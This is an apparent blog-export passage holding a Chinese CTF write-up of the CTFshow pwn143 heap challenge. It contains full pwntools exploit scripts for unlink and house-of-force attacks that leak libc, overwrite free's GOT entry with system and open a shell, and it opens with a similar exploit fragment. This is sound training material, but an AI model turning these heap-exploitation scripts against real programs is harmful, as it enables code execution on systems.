class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28206</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Content of heap:&quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Content of heap : &quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">free_got=elf.got[<span class=\"string\">&quot;free&quot;</span>]</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;bbbb&#x27;</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>.ljust(<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>)+<span class=\"string\">b&#x27;\\x41&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span>+p64(<span class=\"number\">0x30</span>)+p64(free_got))</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Content : &quot;</span>)</span><br><span class=\"line\">free=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;free-&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free)))</span><br><span class=\"line\">libc=finder(<span class=\"string\">&quot;free&quot;</span>,free)</span><br><span class=\"line\">libcbase=free-libc.dump(<span class=\"string\">&quot;free&quot;</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,p64(system))</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"usf","date":"2025-03-24T15:42:57.000Z","updated":"2025-03-24T15:43:41.147Z","keywords":null,"description":null,"top_img":null,"comments":1,"cover":null,"toc":null,"toc_number":null,"toc_style_simple":null,"copyright":null,"copyright_author":null,"copyright_author_href":null,"copyright_url":null,"copyright_info":null,"mathjax":null,"katex":null,"aplayer":null,"highlight_shrink":null,"aside":null,"swiper_index":1,"top_group_index":1,"background":"#fff","_content":"","source":"_posts/usf.md","raw":"---\ntitle: usf\ndate: 2025-03-24 23:42:57\nupdated:\ntags:\ncategories:\nkeywords:\ndescription:\ntop_img:\ncomments:\ncover:\ntoc:\ntoc_number:\ntoc_style_simple:\ncopyright:\ncopyright_author:\ncopyright_author_href:\ncopyright_url:\ncopyright_info:\nmathjax:\nkatex:\naplayer:\nhighlight_shrink:\naside:\nswiper_index: 1\ntop_group_index: 1\nbackground: \"#fff\"\n---\n","slug":"usf","published":1,"layout":"post","photos":[],"_id":"cm8nyp9ie0004bcmyh87gbxeo","content":"","excerpt":"","more":""},{"title":"CTFshow pwn143","_content":"# CTFshow pwn143 (unlink & houce of force)\n\n## ida分析\n\n### main函数分析\n![1741875084264.png](https://img.picui.cn/free/2025/03/13/67d2e78e7977a.png)\n1.经典菜单题\n2.但是值得注意的是case 5 会调用v4[1] ，可以覆盖其中地址为题目留下的后门函数\n\n### add函数分析\n![1741875249131.png](https://img.picui.cn/free/2025/03/13/67d2e832e7df2.png)\n1.理清题目堆块指针的保存结构，使用list数组保存对应的堆块大小\n2.使用heaplist数组，保存堆块的地址\n\n### edit函数分析\n![1741875438296.png](https://img.picui.cn/free/2025/03/13/67d2e8f044392.png)\n1.发现溢出漏洞，可以溢出多字节\n\n### show函数分析\n![1741875684508.png](https://img.picui.cn/free/2025/03/13/67d2e9e693af7.png)\n1.没什么特别的，就是可以用来泄露libc\n\n### delete函数分析\n![1741875887777.png](https://img.picui.cn/free/2025/03/13/67d2eab191a39.png)\n1.没有漏洞，释放后将指针置空了\n\n## 构造思路\n1.首先这题在edit时留出了任意长度的溢出，但是没有uaf漏洞。所以这道题首先考虑unlink方法；同时这道题在case5 留出了一个v4给我们操作，那么如果可以通过某种方法申请到这块空间，就可以篡改为题目留下来的后门函数。这里可以使用house of force，也可以考虑fastbin dup吧，后续可以尝试。\n2.那么确定攻击的方法之后，只需要注意几个点。如果采用unlink的手法，必须注意，伪造的fake_chunk的地址，必须是存放我们进行unlink操作的堆块的地址，如下图中所示。ptr就是存放堆块0的指针\n![1741876735944.png](https://img.picui.cn/free/2025/03/13/67d2ee0282c68.png)\n3.此题使用unlink还要注意，堆块0的不能大于fastbin的大小，否则最后delete时会报错，不知道为什么。（待解决）明明unlink操作成功，修改free_got也成功，就是会报错。\n4.如果使用house of force 的手法，那么只需要修改top的size，为-1(0xffffffffffffffff)。然后根据偏移，申清负数大小的堆块，是top_chunk迁移到目的地址(注意留出chunk头大小的空间)，然后申清就可以分配到这块空间。\n\n## exp\n### unlink\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='pwn.challenge.ctf.show'\nport=28159\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"2\")\n    io.recvuntil(\"length:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef edit(idx,size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"3\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n    io.recvuntil(\"of name:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef show():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"1\")\n   \ndef delete(idx):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"4\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n\nflag=0x400D7F\nadd(0x60,b'aaaa') #0\nadd(0x90,b'bbbb') #1\nadd(0x80,b'cccc') #2\nadd(0x20,b'/bin/sh\\x00') #3\nptr=0x6020a8\nfd=ptr-0x18\nbk=ptr-0x10\nfake_chunk=p64(0)+p64(0x61)\nfake_chunk+=p64(fd)+p64(bk)\nfake_chunk+=p64(0)*8\nfake_chunk+=p64(0x60)+p64(0xa0)\n\nedit(0,len(fake_chunk),fake_chunk)\n#gdb.attach(io)\ndelete(1)\npayload=p64(0)+p64(0)+p64(0x90)+p64(elf.got['free'])\nedit(0,len(payload),payload)\n#gdb.attach(io)\nshow()\nio.recv(4)\nfree=u64(io.recv(6).ljust(8,b'\\x00'))\nlog.success(\"free-{}\".format(hex(free)))\nlibc=LibcSearcher(\"free\",free)\nlibcbase=free-libc.dump(\"free\")\nsystem=libcbase+libc.dump(\"system\")\ngdb.attach(io)\nedit(0,0x8,p64(system))\ndelete(3)\nio.interactive()\n```\n### house of force\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='pwn.challenge.ctf.show'\nport=28197\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"2\")\n    io.recvuntil(\"length:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef edit(idx,size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"3\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n    io.recvuntil(\"of name:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef show():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"1\")\n   \ndef delete(idx):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"4\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\ndef get_flag():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"5\")\nflag=0x400D7F\nadd(0x30,b'aaaa')\npayload=p64(0)*7+p64(0xffffffffffffffff)\n\nedit(0,0x41,payload)\n\noffset=-0x70\nadd(offset,b'aaaa')\n#gdb.attach(io)\nadd(0x10,p64(flag)*2)\nget_flag()\nio.interactive()\n```","source":"_posts/heap/CTFshow pwn143.md","raw":"---\ntitle: CTFshow pwn143\n---\n# CTFshow pwn143 (unlink & houce of force)\n\n## ida分析\n\n### main函数分析\n![1741875084264.png](https://img.picui.cn/free/2025/03/13/67d2e78e7977a.png)\n1.经典菜单题\n2.但是值得注意的是case 5 会调用v4[1] ，可以覆盖其中地址为题目留下的后门函数\n\n### add函数分析\n![1741875249131.png](https://img.picui.cn/free/2025/03/13/67d2e832e7df2.png)\n1.理清题目堆块指针的保存结构，使用list数组保存对应的堆块大小\n2.使用heaplist数组，保存堆块的地址\n\n### edit函数分析\n![1741875438296.png](https://img.picui.cn/free/2025/03/13/67d2e8f044392.png)\n1.发现溢出漏洞，可以溢出多字节\n\n### show函数分析\n![1741875684508.png](https://img.picui.cn/free/2025/03/13/67d2e9e693af7.png)\n1.没什么特别的，就是可以用来泄露libc\n\n### delete函数分析\n![1741875887777.png](https://img.picui.cn/free/2025/03/13/67d2eab191a39.png)\n1.没有漏洞，释放后将指针置空了\n\n## 构造思路\n1.首先这题在edit时留出了任意长度的溢出，但是没有uaf漏洞。所以这道题首先考虑unlink方法；同时这道题在case5 留出了一个v4给我们操作，那么如果可以通过某种方法申请到这块空间，就可以篡改为题目留下来的后门函数。这里可以使用house of force，也可以考虑fastbin dup吧，后续可以尝试。\n2.那么确定攻击的方法之后，只需要注意几个点。如果采用unlink的手法，必须注意，伪造的fake_chunk的地址，必须是存放我们进行unlink操作的堆块的地址，如下图中所示。ptr就是存放堆块0的指针\n![1741876735944.png](https://img.picui.cn/free/2025/03/13/67d2ee0282c68.png)\n3.此题使用unlink还要注意，堆块0的不能大于fastbin的大小，否则最后delete时会报错，不知道为什么。（待解决）明明unlink操作成功，修改free_got也成功，就是会报错。\n4.如果使用house of force 的手法，那么只需要修改top的size，为-1(0xffffffffffffffff)。然后根据偏移，申清负数大小的堆块，是top_chunk迁移到目的地址(注意留出chunk头大小的空间)，然后申清就可以分配到这块空间。\n\n## exp\n### unlink\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='pwn.challenge.ctf.show'\nport=28159\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"2\")\n    io.recvuntil(\"length:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef edit(idx,size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"3\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n    io.recvuntil(\"of name:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef show():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"1\")\n   \ndef delete(idx):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"4\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n\nflag=0x400D7F\nadd(0x60,b'aaaa') #0\nadd(0x90,b'bbbb') #1\nadd(0x80,b'cccc') #2\nadd(0x20,b'/bin/sh\\x00') #3\nptr=0x6020a8\nfd=ptr-0x18\nbk=ptr-0x10\nfake_chunk=p64(0)+p64(0x61)\nfake_chunk+=p64(fd)+p64(bk)\nfake_chunk+=p64(0)*8\nfake_chunk+=p64(0x60)+p64(0xa0)\n\nedit(0,len(fake_chunk),fake_chunk)\n#gdb.attach(io)\ndelete(1)\npayload=p64(0)+p64(0)+p64(0x90)+p64(elf.got['free'])\nedit(0,len(payload),payload)\n#gdb.attach(io)\nshow()\nio.recv(4)\nfree=u64(io.recv(6).ljust(8,b'\\x00'))\nlog.success(\"free-{}\".format(hex(free)))\nlibc=LibcSearcher(\"free\",free)\nlibcbase=free-libc.dump(\"free\")\nsystem=libcbase+libc.dump(\"system\")\ngdb.attach(io)\nedit(0,0x8,p64(system))\ndelete(3)\nio.interactive()\n```\n### house of force\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='pwn.challenge.ctf.show'\nport=28197\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"2\")\n    io.recvuntil(\"length:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef edit(idx,size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"3\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n    io.recvuntil(\"of name:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef show():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"1\")\n   \ndef delete(idx):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"4\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\ndef get_flag():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"5\")\nflag=0x400D7F\nadd(0x30,b'aaaa')\npayload=p64(0)*7+p64(0xffffffffffffffff)\n\nedit(0,0x41,payload)\n\noffset=-0x70\nadd(offset,b'aaaa')\n#gdb.attach(io)\nadd(0x10,p64(flag)*2)\nget_flag()\nio.interactive()\n```","slug":"heap/CTFshow pwn143","published":1,"date":"2025-03-24T14:32:33.562Z","updated":"2025-03-24T14:37:10.699Z","comments":1,"layout":"post","photos":[],"_id":"cm8nyp9if0005bcmyfxk4akcr","content":"<h1 id=\"CTFshow-pwn143-unlink-houce-of-force\"><a href=\"#CTFshow-pwn143-unlink-houce-of-force\" class=\"headerlink\" title=\"CTFshow pwn143 (unlink &amp; houce of force)\"></a>CTFshow pwn143 (unlink &amp; houce of force)</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/13/67d2e78e7977a.png\" alt=\"1741875084264.png\"><br>1.经典菜单题<br>2.但是值得注意的是case 5 会调用v4[1] ，可以覆盖其中地址为题目留下的后门函数</p>\n<h3 id=\"add函数分析\"><a href=\"#add函数分析\" class=\"headerlink\" title=\"add函数分析\"></a>add函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/13/67d2e832e7df2.png\" alt=\"1741875249131.png\"><br>1.理清题目堆块指针的保存结构，使用list数组保存对应的堆块大小<br>2.使用heaplist数组，保存堆块的地址</p>\n<h3 id=\"edit函数分析\"><a href=\"#edit函数分析\" class=\"headerlink\" title=\"edit函数分析\"></a>edit函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/13/67d2e8f044392.png\" alt=\"1741875438296.png\"><br>1.发现溢出漏洞，可以溢出多字节</p>\n<h3 id=\"show函数分析\"><a href=\"#show函数分析\" class=\"headerlink\" title=\"show函数分析\"></a>show函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/13/67d2e9e693af7.png\" alt=\"1741875684508.png\"><br>1.没什么特别的，就是可以用来泄露libc</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/13/67d2eab191a39.png\" alt=\"1741875887777.png\"><br>1.没有漏洞，释放后将指针置空了</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先这题在edit时留出了任意长度的溢出，但是没有uaf漏洞。所以这道题首先考虑unlink方法；同时这道题在case5 留出了一个v4给我们操作，那么如果可以通过某种方法申请到这块空间，就可以篡改为题目留下来的后门函数。这里可以使用house of force，也可以考虑fastbin dup吧，后续可以尝试。<br>2.那么确定攻击的方法之后，只需要注意几个点。如果采用unlink的手法，必须注意，伪造的fake_chunk的地址，必须是存放我们进行unlink操作的堆块的地址，如下图中所示。ptr就是存放堆块0的指针<br><img src=\"https://img.picui.cn/free/2025/03/13/67d2ee0282c68.png\" alt=\"1741876735944.png\"><br>3.此题使用unlink还要注意，堆块0的不能大于fastbin的大小，否则最后delete时会报错，不知道为什么。（待解决）明明unlink操作成功，修改free_got也成功，就是会报错。<br>4.如果使用house of force 的手法，那么只需要修改top的size，为-1(0xffffffffffffffff)。然后根据偏移，申清负数大小的堆块，是top_chunk迁移到目的地址(注意留出chunk头大小的空间)，然后申清就可以分配到这块空间。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28159</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;length:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;of name:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">flag=<span class=\"number\">0x400D7F</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">b&#x27;bbbb&#x27;</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;cccc&#x27;</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\">ptr=<span class=\"number\">0x6020a8</span></span><br><span class=\"line\">fd=ptr-<span class=\"number\">0x18</span></span><br><span class=\"line\">bk=ptr-<span class=\"number\">0x10</span></span><br><span class=\"line\">fake_chunk=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">fake_chunk+=p64(fd)+p64(bk)</span><br><span class=\"line\">fake_chunk+=p64(<span class=\"number\">0</span>)*<span class=\"number\">8</span></span><br><span class=\"line\">fake_chunk+=p64(<span class=\"number\">0x60</span>)+p64(<span class=\"number\">0xa0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(fake_chunk),fake_chunk)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x90</span>)+p64(elf.got[<span class=\"string\">&#x27;free&#x27;</span>])</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recv(<span class=\"number\">4</span>)</span><br><span class=\"line\">free=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span 